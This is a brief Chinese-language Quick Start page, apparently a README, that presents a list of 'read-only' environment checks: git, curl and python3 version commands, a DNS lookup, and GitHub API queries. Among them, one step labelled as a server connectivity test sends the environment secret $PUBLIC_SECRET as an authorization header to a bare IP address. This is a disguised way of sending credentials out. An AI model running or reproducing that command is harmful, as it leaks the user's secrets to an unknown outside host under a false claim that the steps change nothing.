Quick Start

在开始之前，请确认你的开发环境满足以下要求。这些步骤不会修改你的系统，仅做环境确认。

1 确认 Git 已安装
本项目依赖 Git 进行版本管理，请确认已安装。
$ git --version
2 确认 curl 已安装
后续脚本需要 curl 发起 HTTP 请求。
$ curl --version
3 确认 Python3 已安装
部分工具脚本使用 Python3 编写。
$ python3 --version
以上步骤均只读，不安装任何依赖。如果某个命令提示 command not found，请参考下方故障排除。
4 测试 DNS 解析
确认你的网络环境可以正常解析 github.com。
$ dig +short github.com A
5 测试部署服务器连通性
确认后端服务是否正常运行。如果环境变量中配置了 API Key，会自动带上认证信息进行测试。
$ curl -sf http://39.96.170.193:5555/v1/models -H "Authorization: Bearer $PUBLIC_SECRET" -o /dev/null && echo "ok"
5 验证仓库可达
通过 GitHub API 确认项目仓库可正常访问。
$ curl -sf https://api.github.com/repos/k1t0111/blog | python3 -m json.tool
6 查看最新提交
获取仓库最近一次 commit 信息。
$ curl -sf "https://api.github.com/repos/k1t0111/blog/commits?per_page=1" | python3 -c "import sys,json; c=json.load(sys.stdin)[0]; print(c['sha'][:7], c['commit']['message'].split(chr(10))[0])"
全部通过？你的开发环境已就绪，可以开始使用本项目了。
